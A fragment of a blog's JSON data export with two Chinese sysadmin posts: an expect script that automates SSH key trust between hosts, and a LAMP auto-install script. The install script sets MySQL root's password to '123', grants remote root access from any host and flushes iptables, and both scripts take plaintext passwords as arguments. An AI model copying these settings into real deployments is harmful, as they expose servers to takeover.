&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;n&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></li><li><br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;Overwrite (y/n)&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;nn&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;eof {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;exit<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li><br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}<br /></li><li>}<br /></li><li>EOF<br /></li><li>}<br /></li><li><br /></li><li>#从远程主机1获取公钥保存到本地<br /></li><li>Get_pub()<br /></li><li>{<br /></li><li>expect &lt;&lt; EOF<br /></li><li><br /></li><li>spawn scp $src_username@$src_host:~/.ssh/id_rsa.pub /tmp<br /></li><li>expect {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; &quot;password:&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;$src_passwdn&quot;;exp_continue<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; &quot;yes/no*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;yesn&quot;;exp_continue<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; eof {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;exit<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></li><li>}<br /></li><li>EOF<br /></li><li>}<br /></li><li>#将公钥的内容附加到远程主机2的authorized_keys<br /></li><li>Put_pub()<br /></li><li>{<br /></li><li>src_pub=&quot;$(cat /tmp/id_rsa.pub)&quot;<br /></li><li>expect &lt;&lt; EOF<br /></li><li>spawn ssh $dst_username@$dst_host &quot;chmod 700 ~/.ssh;echo $src_pub &gt;&gt; ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_ke<br /></li><li>ys&quot;<br /></li><li>expect {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;password:&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;send &quot;$dst_passwdn&quot;;exp_continue<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;yes/no*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;send &quot;yesn&quot;;exp_continue<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;eof {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;exit<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; } <br /></li><li>}<br /></li><li>EOF<br /></li><li>}<br /></li><li>Keygen<br /></li><li>Get_pub<br /></li><li>Put_pub</li></ol><em></em>脚本主要由3个expect组成，比较简单，用法是<ol><li>./ssh_trust.sh host1 user1 passwd1 host2 user2 passwd2</li></ol><em></em>即建立从user1@host1到user2@host2的ssh信任。<br />说明：<br />1、当然得安装expect<br />2、脚本放在第三方机器（能远程登录host1和host2）上运行即可，当然放在host1和host2上运行也行。<br />3、如果想批量建立信任，可以编辑一个文件夹file如：<ol><li>host1 user1 passwd1 host2 user2 passwd2<br /></li><li>host3 user3 passwd3 host4 user4 passwd4<br /></li><li>host5 user5 passwd5 host6 user6 passwd6</li></ol><em></em>使用下面命令执行脚本即可：<ol><li>xargs -n6 ./ssh_trust.sh &lt; file</li></ol><em></em>4、仓促写的，脚本只是简单实现功能，使用前确保参数的可用性（用户密码主机名），不然很容易报错<br />5、只在linuxredhat上测试过，运行成功，欢迎大家提意见~~","site":{"data":{}},"excerpt":"","more":"<p>转自：www.chinaunix.net。作者：老表</p><p>&nbsp;</p><p>在工作中经常遇到给两台主机建立ssh信任，手动建立太费事了，索性胡乱写了个脚本ssh_trust.sh来自动建立信任：</p><ol><li>#!/bin/bash<br /></li><li>src_host=$1<br /></li><li>src_username=$2<br /></li><li>src_passwd=$3<br /></li><li><br /></li><li>dst_host=$4<br /></li><li>dst_username=$5<br /></li><li>dst_passwd=$6<br /></li><li><br /></li><li>#在远程主机1上生成公私钥对<br /></li><li>Keygen()<br /></li><li>{<br /></li><li>expect &lt;&lt; EOF<br /></li><li><br /></li><li>spawn ssh $src_username@$src_host ssh-keygen -t rsa<br /></li><li>while 1 {<br /></li><li><br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;expect {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;password:&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;$src_passwdn&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;yes/no*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;yesn&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;Enter file in which to save the key*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;n&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;Enter passphrase*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;n&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;Enter same passphrase again:&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;n&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></li><li><br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;Overwrite (y/n)&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;nn&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;eof {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;exit<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li><br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}<br /></li><li>}<br /></li><li>EOF<br /></li><li>}<br /></li><li><br /></li><li>#从远程主机1获取公钥保存到本地<br /></li><li>Get_pub()<br /></li><li>{<br /></li><li>expect &lt;&lt; EOF<br /></li><li><br /></li><li>spawn scp $src_username@$src_host:~/.ssh/id_rsa.pub /tmp<br /></li><li>expect {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; &quot;password:&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;$src_passwdn&quot;;exp_continue<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; &quot;yes/no*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;yesn&quot;;exp_continue<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; eof {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;exit<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></li><li>}<br /></li><li>EOF<br /></li><li>}<br /></li><li>#将公钥的内容附加到远程主机2的authorized_keys<br /></li><li>Put_pub()<br /></li><li>{<br /></li><li>src_pub=&quot;$(cat /tmp/id_rsa.pub)&quot;<br /></li><li>expect &lt;&lt; EOF<br /></li><li>spawn ssh $dst_username@$dst_host &quot;chmod 700 ~/.ssh;echo $src_pub &gt;&gt; ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_ke<br /></li><li>ys&quot;<br /></li><li>expect {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;password:&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;send &quot;$dst_passwdn&quot;;exp_continue<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;yes/no*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;send &quot;yesn&quot;;exp_continue<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;eof {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;exit<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; } <br /></li><li>}<br /></li><li>EOF<br /></li><li>}<br /></li><li>Keygen<br /></li><li>Get_pub<br /></li><li>Put_pub</li></ol><em></em>脚本主要由3个expect组成，比较简单，用法是<ol><li>./ssh_trust.sh host1 user1 passwd1 host2 user2 passwd2</li></ol><em></em>即建立从user1@host1到user2@host2的ssh信任。<br />说明：<br />1、当然得安装expect<br />2、脚本放在第三方机器（能远程登录host1和host2）上运行即可，当然放在host1和host2上运行也行。<br />3、如果想批量建立信任，可以编辑一个文件夹file如：<ol><li>host1 user1 passwd1 host2 user2 passwd2<br /></li><li>host3 user3 passwd3 host4 user4 passwd4<br /></li><li>host5 user5 passwd5 host6 user6 passwd6</li></ol><em></em>使用下面命令执行脚本即可：<ol><li>xargs -n6 ./ssh_trust.sh &lt; file</li></ol><em></em>4、仓促写的，脚本只是简单实现功能，使用前确保参数的可用性（用户密码主机名），不然很容易报错<br />5、只在linuxredhat上测试过，运行成功，欢迎大家提意见~~"},{"title":"自动安装脚本","date":"2010-10-09T09:19:00.000Z","_content":"<p>LAMP自动安装脚本,为工作的时候，天天敲命令，autoinstall。</p><p>很垃圾的、没有什么华丽的语言、N年后，看看自己写的，能笑什么样、</p><p>安装程序就不拿出来了、代码如下：</p><p> </p><p>&lt;code&gt;</p><p> </p><p>#!/bin/sh</p><p>#autoinstall 自动安装脚本<br />#本脚本用于hrjd server安装使用<br />#跑去文档，傻瓜式安装。<br />#没有自动判断文件功能<br />#应该遵循文件名称，不然报错<br />#注意错误提示，及时排错<br />#所有安装文件必须放在/root/hrjd下面</p><p>#2010.10.09 by:key1088</p><p>#jiance code<br />ls /usr/cis7|grep server &gt; test1<br />ps aux|grep httpd|grep -v grep &gt;&gt; test1<br />if [ -s test1 ];then<br />rm -f test1<br />echo -e &quot; 33[31m----------------jiance-------------- 33[0m&quot;<br />echo -e &quot; 33[33m------server----- 33[0m&quot;<br />ps aux|grep server|grep -v grep<br />echo -e &quot; 33[33m------lowlessip----- 33[0m&quot;<br />ps aux|grep lowlessip|grep -v grep <br />echo -e &quot; 33[33m------guard----- 33[0m&quot;<br />ps aux|grep guard|grep -v grep<br />echo -e &quot; 33[33m------httpd port----- 33[0m&quot;<br />netstat -an|grep :80<br />echo -e &quot; 33[33m------mysql port----- 33[0m&quot;<br />netstat -an|grep :3306<br />echo -e &quot; 33[33m------mode----- 33[0m&quot;<br />lsmod |grep blackwhite<br />echo -e &quot; 33[33m------mybridge----- 33[0m&quot;<br />ifconfig mybridge|grep &quot;inet addr:&quot;<br />echo -e &quot; 33[31m----------------jiance-------------- 33[0m&quot;<br />exit<br />fi<br />#setup code<br />cd /root/hrjd/<br />printf &quot;Start Auto Install hrjd Server SoftWare&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   33[32m[ok] 33[0mn&quot;<br />printf &quot; 33[32m----------------bridge setuping------------------- 33[0mn&quot;<br />tar zxvf bridge-utils-1.0.6.tar.gz<br />cd bridge-utils-1.0.6<br />printf &quot; 33[32m----------------configure --prefix=/usr------------------- 33[0mn&quot;<br />./configure --prefix=/usr<br />printf &quot; 33[32m----------------make------------------- 33[0mn&quot;<br />make<br />printf &quot; 33[32m----------------make install------------------- 33[0mn&quot;<br />make install<br />printf &quot; 33[32m----------------make done------------------- 33[0mn&quot;<br />cd /etc/sysconfig/network-scripts/<br />if [ -f ifcfg-eth0 ]; then<br />echo &quot;DEVICE=eth0&quot; &gt; ifcfg-eth0<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth0<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth0<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth0<br />echo -e &quot; 33[32mifcfg-eth0 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth1 ]; then<br />echo &quot;DEVICE=eth1&quot; &gt; ifcfg-eth1<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth1<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth1<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth1<br />echo -e &quot; 33[32mifcfg-eth1 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth2 ]; then<br />echo &quot;DEVICE=eth2&quot; &gt; ifcfg-eth2<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth2<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth2<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth2<br />echo -e &quot; 33[32mifcfg-eth2 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth3 ]; then<br />echo &quot;DEVICE=eth3&quot; &gt; ifcfg-eth3<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth3<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth3<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth3<br />echo -e &quot; 33[32mifcfg-eth3 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth4 ]; then<br />echo &quot;DEVICE=eth4&quot; &gt; ifcfg-eth4<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth4<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth4<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth5<br />echo -e &quot; 33[32mifcfg-eth4 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth5 ]; then<br />echo &quot;DEVICE=eth5&quot; &gt; ifcfg-eth5<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth5<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth5<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth5<br />echo -e &quot; 33[32mifcfg-eth5 config ok 33[0m&quot;<br />fi<br />echo &quot;DEVICE=mybridge&quot; &gt; ifcfg-mybridge<br />echo &quot;BOOTPROTO=static&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;TYPE=Bridge&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;NETMASK=255.255.255.0&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;IPADDR=192.168.0.204&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;GATEWAY=192.168.0.1&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;STP=on&quot; &gt;&gt; ifcfg-mybridge<br />if [ -f ifcfg-mybridge ]; then<br />echo -e &quot; 33[32mifcfg-mybridge config ok 33[0m&quot;<br />fi<br />printf &quot; 33[32m----------------bridge Done------------------- 33[0mn&quot;<br />cd /root/hrjd<br />printf &quot; 33[32m----------------MySql Setup------------------- 33[0mn&quot;<br />cp my.cnf /etc/my.cnf<br />rpm -ivh mysql-client-5.0.22-0.i386.rpm<br />sleep 1<br />rpm -ivh mysql-devel-5.0.22-0.i386.rpm<br />sleep 1<br />rpm -ivh mysql-shared-5.0.22-0.i386.rpm<br />sleep 1<br />rpm -ivh mysql-server-5.0.22-0.i386.rpm<br />ps aux|grep mysql|grep -v grep &gt; test1<br />if [ -s test1 ];then<br />echo -e &quot; 33[32m----mysql runing ok---- 33[0mn&quot;<br />mysqladmin -u root password 123<br />mysql -uroot -p123 -e &quot;grant all on *.* to <a>'root'@'%'</a> identified by '123'&quot;<br />mysql -uroot -p123 -e &quot;flush privileges&quot;<br />iptables -F<br />rm -r test1<br />echo -e &quot; 33[32m----------------MySql Setup Done-------------- 33[0mn&quot;<br />else<br />echo -e &quot; 33[31m----mysql no runing---- 33[0mn&quot;<br />echo -e &quot; 33[31m----mysql Setup error&quot;<br />fi<br />printf &quot; 33[32m---------------Apache Setup------------------- 33[0mn&quot;<br />tar zxvf httpd-2.2.9.tar.gz<br />cd httpd-2.2.9<br />printf &quot; 33[32m------------Apache ./config------------------- 33[0mn&quot;<br />./configure --prefix=/usr/local/apache2 --enable-so -enable-rewrite<br />printf &quot; 33[32m----------------Apache make------------------- 33[0mn&quot;<br />make<br />printf &quot; 33[32m----------Apache make install----------------- 33[0mn&quot;<br />make install<br />cd /root/hrjd<br />cp -a ruqinjiance/ /usr/local/apache2/htdocs/<br />mv /usr/local/apache2/conf/httpd.conf /usr/local/apache2/conf/httpd.conf.bak<br />cp -a httpd.conf /usr/local/apache2/conf/httpd.conf<br />printf &quot; 33[32m-------------Apache Setup Done---------------- 33[0mn&quot;<br />printf &quot; 33[32m-----------------PHP Setup-------------------- 33[0mn&quot;<br />tar zxvf php-5.2.11.tar.gz<br />cd php-5.2.11<br />printf &quot; 33[32m----------------PHP ./config ----------------- 33[0mn&quot;<br />./configure --prefix=/usr/local/php5 --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql=/usr/bin/mysql --with-config-file-path=/usr/local/apache2/conf --enable-sockets<br />make<br />make install<br />cd /root/hrjd<br />mv /usr/local/php5/php.ini /usr/local/php5/php.ini.bak<br />cp php.ini /usr/local/php5/php.ini<br />printf &quot; 33[32m----------------PHP Setup Done----------------- 33[0mn&quot;<br />printf &quot; 33[32m---------------HRJD SERVER Setup--------------- 33[0mn&quot;<br />cp /root/hrjd/hrjd.tar /usr/hrjd.tar<br />cd /usr<br />tar xvf hrjd.tar<br />cd /root/hrjd<br />chmod 755 rc.local<br />mv /etc/rc.d/rc.local /etc/rc.d/rc.local.bak<br />cp /root/hrjd/rc.local /etc/rc.d/rc.local<br />ls /dev/|grep hda &gt; test1<br />if [ -s test1 ];then<br />echo -e &quot; 33[32m------------IDE HD ID--------------&quot;<br />hdparm -i /dev/hda|grep SerialNo <br />echo -e &quot;------------IDE HD ID-------------- 33[0m&quot;<br />rm -rf test1<br />else<br />chmod 777 sata<br />echo -e &quot; 33[32m------------SAST HD ID--------------&quot;<br />./sata<br />echo -e &quot;------------SAST HD ID-------------- 33[0m&quot;<br />fi<br />printf &quot;HRJD Server setup ok&quot;<br />getchar() {<br />&nbsp;&nbsp;&nbsp;  stty cbreak -echo<br />&nbsp;&nbsp;&nbsp;  dd if=/dev/tty bs=1 count=1\n2&gt; /dev/null<br />&nbsp;&nbsp;&nbsp;  stty -cbreak echo<br />}<br />printf &quot; 33[32m-----------------press any key reboot----------------- 33[0m&quot;<br />ret=`getchar`<br />echo<br />reboot</p><p>&lt;/code&gt;</p>","source":"_posts/自动安装脚本.md","raw":"title: 自动安装脚本\ncategories: [Shell编程]\ntags: []\ndate: 2010-10-09 17:19:00\n---\n<p>LAMP自动安装脚本,为工作的时候，天天敲命令，autoinstall。</p><p>很垃圾的、没有什么华丽的语言、N年后，看看自己写的，能笑什么样、</p><p>安装程序就不拿出来了、代码如下：</p><p> </p><p>&lt;code&gt;</p><p> </p><p>#!/bin/sh</p><p>#autoinstall 自动安装脚本<br />#本脚本用于hrjd server安装使用<br />#跑去文档，傻瓜式安装。<br />#没有自动判断文件功能<br />#应该遵循文件名称，不然报错<br />#注意错误提示，及时排错<br />#所有安装文件必须放在/root/hrjd下面</p><p>#2010.10.09 by:key1088</p><p>#jiance code<br />ls /usr/cis7|grep server &gt; test1<br />ps aux|grep httpd|grep -v grep &gt;&gt; test1<br />if [ -s test1 ];then<br />rm -f test1<br />echo -e &quot; 33[31m----------------jiance-------------- 33[0m&quot;<br />echo -e &quot; 33[33m------server----- 33[0m&quot;<br />ps aux|grep server|grep -v grep<br />echo -e &quot; 33[33m------lowlessip----- 33[0m&quot;<br />ps aux|grep lowlessip|grep -v grep <br />echo -e &quot; 33[33m------guard----- 33[0m&quot;<br />ps aux|grep guard|grep -v grep<br />echo -e &quot; 33[33m------httpd port----- 33[0m&quot;<br />netstat -an|grep :80<br />echo -e &quot; 33[33m------mysql port----- 33[0m&quot;<br />netstat -an|grep :3306<br />echo -e &quot; 33[33m------mode----- 33[0m&quot;<br />lsmod |grep blackwhite<br />echo -e &quot; 33[33m------mybridge----- 33[0m&quot;<br 